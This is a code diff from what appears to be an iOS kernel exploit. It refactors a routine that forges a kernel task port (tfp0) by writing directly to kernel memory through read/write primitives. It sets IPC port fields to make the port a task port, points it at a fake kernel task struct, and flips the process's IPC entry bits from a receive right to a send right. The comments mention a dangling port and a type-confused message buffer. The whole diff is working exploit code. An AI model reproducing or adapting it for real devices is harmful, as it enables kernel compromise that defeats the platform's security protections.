@@ -354,6 +354,39 @@ uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_
   return body;
 }
 
+void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
+    // now make the changes to the port object to make it a task port:
+    uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);
+
+    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
+    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
+    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
+    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
+    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
+
+    // swap our receive right for a send right:
+    uint64_t task_port_addr = task_self_addr();
+    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+
+    uint32_t port_index = port >> 8;
+    const int sizeof_ipc_entry_t = 0x18;
+    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+
+#define IE_BITS_SEND (1<<16)
+#define IE_BITS_RECEIVE (1<<17)
+
+    bits &= (~IE_BITS_RECEIVE);
+    bits |= IE_BITS_SEND;
+
+    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+}
+
+
+void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
+    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
+}
 
 /*
  * the first tpf0 we get still hangs of the dangling port and is backed by a type-confused ipc_kmsg buffer
@@ -369,12 +402,11 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   if (err != KERN_SUCCESS) {
     printf("unable to allocate port\n");
   }
-  
+
   // build a fake struct task for the kernel task:
   //uint64_t fake_kernel_task_kaddr = kmem_alloc_wired(0x4000);
   uint64_t fake_kernel_task_kaddr = early_kalloc(0x1000);
   printf("fake_kernel_task_kaddr: %llx\n", fake_kernel_task_kaddr);
-
   
   void* fake_kernel_task = malloc(0x1000);
   memset(fake_kernel_task, 0, 0x1000);
@@ -390,33 +422,8 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   if (fake_task_refs != 0xd00d) {
     printf("read back value didn't match...\n");
   }
-  
-  // now make the changes to the port object to make it a task port:
-  uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
-  
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
-  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
-  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
-  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
-  
-  // swap our receive right for a send right:
-  uint64_t task_port_addr = task_self_addr();
-  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
-  
-  uint32_t port_index = tfp0 >> 8;
-  const int sizeof_ipc_entry_t = 0x18;
-  uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
 
-#define IE_BITS_SEND (1<<16)
-#define IE_BITS_RECEIVE (1<<17)
-  
-  bits &= (~IE_BITS_RECEIVE);
-  bits |= IE_BITS_SEND;
-  
-  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+    convert_port_to_task_port(tfp0, space, fake_kernel_task_kaddr);
   
   printf("about to test new tfp0\n");
   
